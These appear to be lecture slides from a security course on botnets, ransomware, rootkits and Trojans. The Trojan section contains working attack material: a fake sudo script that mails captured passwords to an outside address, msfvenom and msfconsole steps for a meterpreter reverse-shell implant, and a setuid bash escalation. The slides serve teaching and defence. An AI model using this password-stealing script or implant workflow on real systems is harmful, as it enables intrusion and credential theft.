# Bots and Botnets
</textarea></section>
    
<section data-markdown data-separator="^\n\n\n"><textarea data-template>
## Bot
- Bot: a piece of software that performs automated tasks, imitating a human
- Examples and uses:
  - Web crawlers
  - Reddit auto-posters
  - Conversation with actual humans
  - Increase trading positions
  - Add reviews to a product
- And, of course, for malicious purposes
  - Often called a zombie computer in this context



<!-- .slide: class="right-float-img-1000" -->
## Typically installed on

<img src="https://imgs.xkcd.com/comics/smart_home_security.png" title="If they&#39;re getting valuable enough stuff from you, at least the organized crime folks have an incentive to issue regular updates to keep the appliance working after the manufacturer discontinues support." alt="Smart Home Security" srcset="https://imgs.xkcd.com/comics/smart_home_security_2x.png 2x" style="image-orientation:none" class='stretch'>

- Computers
- Phones
- IoT devices, as in [xkcd # 1966](http://xkcd.com/1966/)
  - This is the big one!



<!-- .slide: class="right-float-img-600" -->
## Botnet

<a href='https://commons.wikimedia.org/wiki/File:Stachledraht_DDos_Attack.svg'><img src='https://upload.wikimedia.org/wikipedia/commons/3/3f/Stachledraht_DDos_Attack.svg' style="max-height:unset;height:500px"></a>

- A collection of Internet connected bots
- Typically performs a negative function
  - Stealing data
  - Denial of service attacks
- Renting



## Bot installation
- Via malware:
  - Trojans
  - Worms
  - Viruses (maybe)
- Phishing scams
- Logins with weak passwords (Morris Worm)
- Malicious web pages running in insecure browsers



## Botnet control
- Once you have the bots, they have to *listen* for commands "somewhere"
  - The bots also post their results back to that same "somewhere"
- This is called command and control (C&C)



<!-- .slide: class="right-float-img-600" -->
## Botnet control: Client-server

<a href='https://en.wikipedia.org/wiki/File:Server-based-network.svg'><img src='https://upload.wikimedia.org/wikipedia/commons/f/fb/Server-based-network.svg' style="width:350px"></a>

- Botmaster has control of one or more servers
  - Perhaps a website, perhaps a full machine
  - Could also be a centralized newsgroup, forum, channel, etc.
- Commands for the bot network are posted there
- Defense: block the IP address(es) in the router
  - And add a Snort rule!



## Botnet control: IRC (etc.)
- Internet Relay Chat is a distributed messaging system
- Botmaster creates a channel
  - Each bot "checks in" to that channel
- Commands for the bots are put there
  - Bots also post their results
- This is a form of client-server
  - The IRC channel is the "server"
- Defense: these channels can be taken down



<!-- .slide: class="right-float-img-600" -->
## Botnet control: Peer-to-peer

<a href='https://en.wikipedia.org/wiki/File:P2P-network.svg'><img src='https://upload.wikimedia.org/wikipedia/commons/3/3f/P2P-network.svg' style="width:350px"></a>

- Each bot opens a given port on the machine
  - Or maybe a random port
- A bot will then then try random IP addresses
  - And maybe random ports
- Until it finds another infected machine to make its peer
- Advantages is that it avoids a single point of failure
- Modern botnets use this



## Blocking P2P bots
- This is much harder
  - A lot of legitimate traffic is P2P
  - And a bot's traffic can be disguised as legitimate traffic




<!-- .slide: class="right-float-img-600 no-border" -->
## Honeypots
[![](https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/Old_Honey_Pot_%286740954363%29.jpg/406px-Old_Honey_Pot_%286740954363%29.jpg)](https://commons.wikimedia.org/wiki/File:Old_Honey_Pot_(6740954363).jpg)
- A known installation on a machine that looks vulnerable to outside agents
  - Open ports, etc.
- If infected, one can study what the infection did
  - Both it's effect on the computer
  - And via a .pcap of the network traffic
- If attacked...
  - One can study the attack mechanism
  - And block that IP from contacting your network



## Case study: Mirai botnet
- In 2016, it logged in to IoT devices with the default username and password
  - Scanned for port 23, and attempted to login
  - If successful, downloaded botnet code to device
- At it's peak, controlled 350k devices
- Source code online at https://github.com/jgamblin/Mirai-Source-Code
- Used the client-server model
  - The ISP of the server was contacted, and took that IP offline...
  - ... but Mirai got that IP from a URL, so it just changed over to a different server
- The URL was harder to take down, and this botnet persisted for *months*



## Case study: Storm worm botnet
- Researchers infiltrated and monitored the [Storm worm](https://en.wikipedia.org/wiki/Storm_Worm) (and botnet) in 2007
  - After 26 days, and 350M e-mails, only 28 sales resulted (mostly for male enhancement)
    - Average price: $100
  - Profits were estimated at $2,731.88
  - Just over $100 per day
  - This was with 1.5% of the Storm botnet
  - Extrapolating, that's about $7,000 per day with the entire Storm botnet, if you could utilize all that capacity

# Ransomware
</textarea></section>
    
<section data-markdown data-separator="^\n\n\n"><textarea data-template>
## Ransomware
- Malicious software that "locks" the computer, and only unlocks it when payment is made
  - Locking is typically through encrypting the files
    - Thus also called *cryptoviral extortion*
  - Payment is typically through cryptocurrency
- Typically distributed by a Trojan
  - But some have been known to propagate via a worm



## Defense: tracing
- If your machine suffered a ransomware attack, you might:
  - Analyze the executable to see the encryption algorithm used
  - Review the network packets to see if the key is visible therein
  - Perform more analysis to determine the key used for the encryption
  - Then decrypt your files
- If that were the case, ransomware would never be effective
- So the cryptographic keys can't be kept on the computer



## Ransomware key management
- The released ransomware has a public key of the attacker
- The ransomware generates a random key
  - Files are encrypted using a modern symmetric encryption algorithm (AES, for example)
- The key is encrypted with the attacker's public key
  - This is the RSA encrypted AES decryption key
  - It is then erased entirely from the machine
- Now no key exists on the victim computer



## Ransomware ransom
- The victim pays the ransom
  - Usually via cryptocurrency, since that's not very traceable
- And also sends the RSA encrypted AES decryption key to the attacker
- The attacker can decrypt that key
  - And *might* return it once the ransom is paid
  - But usually does -- otherwise no future victims will pay



## Leakware / Doxware
- Rather than extortion for payment, this is extortion to not release the files
- Imagine a health system had its data exfiltrated
- A ransom demand could be made to not release this data publicly
- Types of information used in these attacks:
  - 3rd party information (bank accounts, health data)
  - Proprietary information (trade secrets, product information)
  - Embarrassing information (health info, browsing history)



## Mobile ransomware
- Target is not file encryption
  - Since most devices have backups in the cloud
- Instead, it locks the phone
  - And unlocks it when the ransom is paid
- More often happens with Android devices
  - As Android allows installation from 3rd party sources
  - It happens on iOS, just much less



## Case Study: WannaCry
- Used an exploit in MS Windows, demanded payment in Bitcoin
- Effected 300k machines
  - With damages estimated from "hundreds of millions to billions" of US dollars
- It used the EternalBlue exploit
  - Developed by the NSA
  - And released to the public by [The Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers), who obtained many of the NSA's cyberweapons in 2016



<h2 class="r-fit-text">Case Study: <a href='https://en.wikipedia.org/wiki/2019_Baltimore_ransomware_attack'>2019 Baltimore attack</a></h2>

- A use of the Robbinhood Ransomware
- Why was Baltimore susceptible?
  - Decentralized control of IT budget
  - Insufficient finding for information security
- Effects: multiple municipal services down for *months*, including databases and applications
- It is speculated that it also used EternalBlue
- Ransom demand: demanded 13 bitcoin (about $76k then)
- Baltimore refused to pay, and had to spend 4 months, and $18 *million*, to recover



<!-- .slide: class="right-float-img-400 no-border" -->
## Case study: Petya & NotPetya
[![](https://upload.wikimedia.org/wikipedia/commons/6/65/2017_Petya_cyberattack_screenshot.png)](https://commons.wikimedia.org/wiki/File:2017_Petya_cyberattack_screenshot.png)
- Infected Ukrainian companies through a back door put into a Ukrainian version of a TurboTax-like software
  - Companies with Ukrainian subsidiaries were infected through their corporate network
- This was "the equivalent of using a nuclear bomb to achieve a small tactical victory"
- There is a good [Wired article](https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/) on it
- It has been speculated that, due to the increases in cybersecurity in Ukraine from this, the defenses were more sound during the Russian invasion

# Rootkits
</textarea></section>
    
<section data-markdown data-separator="^\n\n\n"><textarea data-template>

## Review: rootkits
- A *rootkit* is an exploit that permits an attacker to execute commands with root privileges
  - i.e. as root on Linux or as Administrator on Windows
  - It does this *while hiding the activity to avoid detection* by system administrators
- To hide from a system administrator on a Unix system, the attacker would want to suppress displays of attacker processes, attacker files, attacker logins, etc.
  - Several utilities (e.g. ps, ls, users) would need to be replaced with versions that will hide files, logins, and processes
- Goal is likely one of: ransomware, data exfiltration, or a bot in a botnet



## Review: Kernel Level Rootkits
- A kernel level rootkit adds to, or modifies, the OS kernel code to patch or hook system calls, so that the Trojan Horse version hides info about the attacker
  - Often done in Linux with a Loadable Kernel Module
  - Windows equivalent is usually a loadable device driver



<h2 class="r-fit-text">Review: Application Level Rootkits</h2>

- Application level rootkits patch or replace a significant application with a Trojan Horse version
  - Easier than kernel level to do; also easier to detect
- Often a lot of system applications are replaced
  - ls, ps, users, who, etc.



## Review: Detecting Rootkits
- Major problem: The OS is not trustworthy during the scanning process, if there is a kernel mode rootkit present
- Most reliable solution: Shut down system, scan the hard drive from an external connection, with no OS running
- How often do users want to do this???
  - Need scanners similar to antivirus scanners



<!-- .slide: class="small-pre wide-pre" -->
## Network security and rootkits
- Networks are often the means by which a rootkit is downloaded
  - With proper monitoring, this can be detected
- Rootkits have non-standard behavior, and network analysis can sometimes detect this:
```
alert tcp $EXTERNAL_NET any -> $TELNET_SERVERS 23 (
    msg:"BACKDOOR MISC Linux rootkit attempt"; flow:to_server,established; 
    content:"wh00t!"; classtype:attempted-admin; sid:213; rev:4;)
```
- Also, high outbound traffic is suspicious, and could be a rootkit or zombie

## Trojans
[![](https://upload.wikimedia.org/wikipedia/commons/f/fe/Trojan_horse_in_Canakkale%2C_Turkey.jpg)](https://commons.wikimedia.org/wiki/File:Trojan_horse_in_Canakkale,_Turkey.jpg)
- aka Trojan Horses
- Any piece of malware that *misleads* as to its true purpose
  - Named after the fabled Trojan Horse legend
- Spread through social engineering
  - Email attachment
  - Phishing scam
  - Software to "fix" a (non-existent) problem
- Possible goals: create a zombie machine, install spyware, install a backdoor, install ransomware



<!-- .slide: class="right-float-img-600 no-border" -->
## Best. Trojan.  Ever.
[![](https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Brian_Kernighan_and_Ken_Thompson.jpg/1024px-Brian_Kernighan_and_Ken_Thompson.jpg)](https://commons.wikimedia.org/wiki/File:Brian_Kernighan_and_Ken_Thompson.jpg)
- Brian Kernighan (left) and Ken Thompson (right) are the creators of UNIX
- Thompson received the 1983 ACM Turing Award
- His Speech: "[Reflections on Trusting Trust](https://dl.acm.org/doi/10.1145/358198.358210)"
  - Sub-title: "To what extent should one trust a statement that a program is free of Trojan horses? Perhaps it is more important to trust the people who wrote the software."



<!-- .slide: class="small-pre wide-pre" -->
## sudo Trojan (credit: Wikipedia)
```text
#!/usr/bin/env bash

# Turn off the character echo to the screen. sudo does this to prevent the
# user's password from appearing on screen when they type it in.
stty -echo

# Prompt user for password and then read input. To disguise the nature of 
# this malicious version, do this 3 times to imitate the behavior of sudo 
# when a user enters the wrong password.

prompt_count=1
while [ $prompt_count -le 3 ]; do
    echo -n "[sudo] password for $(whoami): "
    read password_input
    echo
    sleep 3  # sudo will pause between repeated prompts
    prompt_count=$(( prompt_count + 1 ))
done

# Turn the character echo back on.
stty echo

echo $password_input | mail -s "$(whoami)'s password" outside@creep.com

# Display sudo's actual error message and then delete self.
echo "sudo: 3 incorrect password attempts"
rm $0

exit 1  # sudo returns 1 with a failed password attempt

```



## How to get them to run it?
- Ensure their $PATH variable has the current directory
```
user@inner:~$ which su
/usr/bin/su
user@inner:/# echo $PATH
/usr/local/bin:/usr/bin:/bin
user@inner:/# export PATH=.:$PATH
user@inner:/# echo $PATH
.:/usr/local/bin:/usr/bin:/bin
user@inner:~$ which su
./su
user@inner:/# 
```



## Implant example: firewall & inner

> Implant: the malicious code inside the Trojan Horse

- *inner* will be the victim machine
- *firewall* will be the attacker machine



<!-- .slide: class="smaller-pre wide-pre" -->
## Step 1: Create the implant
```
root@firewall:/# msfvenom -a `uname -m` --platform linux \
    -p linux/`uname -m`/meterpreter/reverse_tcp LHOST=192.168.100.1 \
    LPORT=443 --smallest -i 2 -e cmd/base64 -f elf -o malicious
Found 1 compatible encoders
Attempting to encode payload with 2 iterations of cmd/base64
cmd/base64 succeeded with size 212 (iteration=0)
cmd/base64 succeeded with size 212 (iteration=1)
cmd/base64 chosen with final size 212
Payload size: 212 bytes
Final size of elf file: 332 bytes
Saved as: malicious
root@firewall:/# 
```

<div style="font-size:0.65em">

- `-a 'uname -m'`: set the architecture for the executable (backtics)
- `--platform linux`: set the target OS
- `-p linux/'uname -m'/meterpreter/reverse_tcp`: set the reverse shell (backtics)
- `LHOST=192.168.100.1`: attacker's host IP
- `LPORT=443`: attacker's host port
- `--smallest`: make it as small as possible
- `-i 2`: how many times to encode the payload (anti-viral)
- `-e cmd/base64`: the particular encoder used
- `-f elf`: executable type ("exe" for Windows)
- `-o malicious`: the output executable



<!-- .slide: class="small-pre wider-pre" -->
## Step 2: Attacker setup
- This is on *firewall*
```
root@firewall:/# msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/aarch64/meterpreter/reverse_tcp
PAYLOAD => linux/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.100.1
LHOST => 192.168.100.1
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.100.1:443 
```
- Use `x86` or `x86_64` if not on a ARM Mac

</div>



## Step 3: Transfer it to the victim machine & run it
- Transfer it: One woiuld use social engineering, stolen credentials, etc., to get it on the victim's machine
  - But we'll scp it:
```
root@firewall:/# scp malicious root@inner:/
malicious                                                                  100%  188   417.8KB/s   00:00    
root@firewall:/# 
```
- Run it: it would be run, in the background, via the Trojan Horse
```
root@inner:/# chmod +x /malicious 
root@inner:/# /malicious  &
[1] 1034
root@inner:/# 
```



<!-- .slide: class="small-pre wider-pre" -->
## Step 4: Use the exploit
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.100.1:443 
[*] Transmitting intermediate midstager...(256 bytes)
[*] Sending stage (949964 bytes) to 192.168.100.2
[*] Meterpreter session 3 opened (192.168.100.1:443 -> 192.168.100.2:41922) at 2024-04-21 15:47:24 -0400

meterpreter > shell
Process 1074 created.
Channel 1 created.
cp /bin/bash /home/user
chmod 4755 /home/user/bash
exit
meterpreter > 
```
- We'll see the `chmod 4755` command later
- Type 'help' to see the commands available in this shell



<!-- .slide: class="small-pre wider-pre" -->
## Detection on *inner*
- It's detectable on *inner* (some lines removed for brevity):
```text
root@inner:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2304  1280 ?        Ss   13:16   0:00 /bin/sh -c '/nws-exec.sh'

root@inner:~# 
```
- To hide this, we would need to install a rootkit as well



## Implanting the implant
- Hide it in a binary file
  - As a hex array, that is written to a binary file, and then run via `os.system()`
- Put in in an installable package
  - Scenario: the "admin" asks you to download and install an update
- As one command of a bash script that does something else
- As just the raw file itself
  - If we don't care if they see any results or not



## Windows Executable Trojans

<a href='https://commons.wikimedia.org/wiki/File:Windows_logo_and_wordmark_-_2021.svg'><img src='https://upload.wikimedia.org/wikipedia/commons/e/e2/Windows_logo_and_wordmark_-_2021.svg' style="float:right;max-width:unset;max-height:unset;width:400px;margin-left:20px"></a>

- Step 1: download the actual program you want to implant a Trojan Horse in
  - We'll call it `program.exe`
  - You can download Windows equivalent programs (Minesweeper, Notepad, etc.) various places online
- First, create the Trojan Horse file:
  - Run `msfvenom`, with the following changes:
    - `--platform windows`: because duh
    - `-x program.exe`: the program to "extend"
    - `-k`: keep the original program's functionality
    - `-f exe`: Windows executable format
    - `-e ...`: pick a more interesting encoder
- This will create the entire Trojan Horse in one command




## Windows Office Trojans

<a href='https://en.wikipedia.org/wiki/File:Microsoft_Office_Logo_(2019-present).svg'><img src='https://upload.wikimedia.org/wikipedia/en/3/35/Microsoft_Office_Logo_%282019-present%29.svg' style="max-width:unset;max-height:unset;width:600px"></a>

- Create the Windows implant as before
- Use `setoolkit` (on Kali) to create a Word (or Excel or PPT) file that uses macros to launch the implant



## Android Trojans

<a href='https://commons.wikimedia.org/wiki/File:Android_robot_(2014-2019).svg'><img src='https://upload.wikimedia.org/wikipedia/commons/e/e0/Android_robot_%282014-2019%29.svg' style="float:right;max-width:unset;max-height:unset;height:300px;margin-left:20px"></a>

- Android is Linux, so create the Linux implant as above
- Download the APK file
  - APK = Android Package file
